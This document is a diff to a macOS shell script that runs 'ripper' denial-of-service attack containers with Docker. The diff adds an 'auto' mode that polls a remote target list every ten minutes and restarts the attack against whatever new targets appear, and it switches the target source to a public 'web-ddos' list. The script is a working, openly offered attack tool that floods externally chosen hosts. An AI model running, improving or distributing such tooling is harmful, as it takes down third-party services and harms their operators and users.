@@ -5,11 +5,12 @@
 # 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)
 
 VERSION='2.1'
-TARGETS_URL='https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'
+TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+INTERVAL='600' # in seconds
 
 function print_help {
   echo -e "Usage: os_x_ripper.sh --mode install"
-  echo -e "--mode|-m   - runmode (install, reinstall, start, stop)"
+  echo -e "--mode|-m   - runmode (install, reinstall, start, stop, auto)"
   echo -e "--number|-n - number of containers to start"
 }
 
@@ -18,7 +19,7 @@ function print_version {
 }
 
 function check_dependencies {
-  if $(docker -v | grep "Docker"); then
+  if [[ -z $(docker -v | grep "Docker") ]]; then
     echo "Please install docker first. https://www.docker.com/products/docker-desktop"
     exit 1
   fi
@@ -61,7 +62,28 @@ function ripper_start {
 
 function ripper_stop {
   echo "Stopping ripper attack"
-  docker-compose down
+  docker-compose down 2> /dev/null
+}
+
+function auto {
+  trap "ripper_stop; exit 0" SIGINT SIGTERM SIGTSTP
+  rm -f targets.txt 2> /dev/null
+  while true; do
+    LOCAL_TARGETS="$(cat targets.txt 2> /dev/null|shasum)"
+    REMOTE_TARGETS="$(curl --silent $TARGETS_URL|shasum)"
+    if [[ ${LOCAL_TARGETS} != ${REMOTE_TARGETS} ]]; then
+      echo "Targets were updated"
+      curl --silent $TARGETS_URL --output targets.txt
+
+      ripper_stop
+      generate_compose
+      ripper_start
+
+    else
+      echo "Targets are up to date. Checking again in ${INTERVAL} seconds"
+    fi
+    sleep ${INTERVAL}
+  done
 }
 
 while test -n "$1"; do
@@ -87,10 +109,13 @@ while test -n "$1"; do
   shift
 done
 
-curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt
 
 check_dependencies
 check_params
+
+curl --silent $TARGETS_URL --output targets.txt
+TARGETS_SHA="$(cat targets.txt|shasum)"
+
 
 case $mode in
   install)
@@ -102,6 +127,9 @@ case $mode in
     ;;
   stop)
     ripper_stop
+    ;;
+  auto)
+    auto
     ;;
   reinstall)
     ripper_stop
